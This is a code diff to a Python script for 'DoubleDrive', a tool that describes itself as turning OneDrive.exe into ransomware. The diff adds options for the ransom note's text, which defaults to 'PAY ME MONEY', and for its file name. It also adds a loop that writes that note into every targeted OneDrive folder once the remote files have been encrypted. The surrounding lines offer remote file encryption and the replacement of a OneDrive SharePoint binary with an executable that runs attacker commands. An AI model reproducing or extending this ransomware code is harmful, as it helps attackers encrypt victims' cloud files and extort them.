@@ -64,6 +64,8 @@ def parse_args():
     parser = argparse.ArgumentParser(description="DoubleDrive - Turns the original OneDrive.exe into a ransomware")
     parser.add_argument("--remote-ransomware", help="If specified, encrypts all the remote files under the directories that were targeted with options_setup.py", action="store_true")
     parser.add_argument("--key-path", default="./key.key", help="Path of the file to save the Fernet encryption/decryption key in, defaults to './key.key'")
+    parser.add_argument("--ransom-note", default="PAY ME MONEY", help="A note to write in the ransom note, defaults to 'PAY ME MONEY'")
+    parser.add_argument("--ransom-note-name", default="RANSOM_NOTE.txt", help="name of the ransom note that is created in each target folder, defaults to 'RANSOM_NOTE.txt'")
     parser.add_argument("--replace-sharepoint", help="If specified, replaces Microsoft.SharePoint.exe which is part of OneDrive's binaries with an executable that executes attacker's commands", action="store_true")
 
     group = parser.add_mutually_exclusive_group(required=False)
@@ -103,6 +105,12 @@ def main():
         onedrive_ransomware = OneDriveRansomware(onedrive_session, )
         all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session, args.key_path)
         onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, quick_delete=configs[ConfigKey.QUICK_DELETE.value])
+        
+        # Create ransom notes
+        for item in get_configs()[ConfigKey.JUNCTION_NAMES_TO_TARGET_PATHS.value].keys():
+            onedrive_junction_item = onedrive_session.get_item_by_path(f"/{item}")
+            ransom_note_path = f"{onedrive_junction_item.full_path}/{args.ransom_note_name}"
+            onedrive_session.create_file(ransom_note_path, args.ransom_note)
 
     
 
